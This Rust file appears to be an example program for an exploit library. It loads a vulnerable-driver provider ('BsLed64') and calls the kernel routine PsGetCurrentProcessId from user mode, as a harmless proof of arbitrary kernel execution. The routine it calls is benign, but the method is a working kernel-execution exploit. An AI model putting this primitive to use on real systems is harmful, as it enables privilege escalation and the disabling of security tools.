use std::ptr;

use providers::bsled::BsLed64;
use vdem::{
    exploit::Exploit, kernel_call::CallBy, traits::ExecuteKernelCall,
    utils::promote_privilege_to_debug_level,
};
use windows::Win32::System::Threading::GetCurrentProcessId;

fn main() {
    promote_privilege_to_debug_level();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    type FnPsGetCurrentProcessId = unsafe extern "C" fn() -> *mut std::ffi::c_void;

    let mut pid = ptr::null_mut();

    exploit
        .get_call::<FnPsGetCurrentProcessId>(CallBy::Name("PsGetCurrentProcessId"))
        .inspect(|ps_get_current_process_id| {
            unsafe { pid = ps_get_current_process_id() };
        })
        .expect("call PsGetCurrentProcessId failed");

    println!("Current process id = {:x}, {:x}", pid as u32, unsafe {
        GetCurrentProcessId()
    });
}
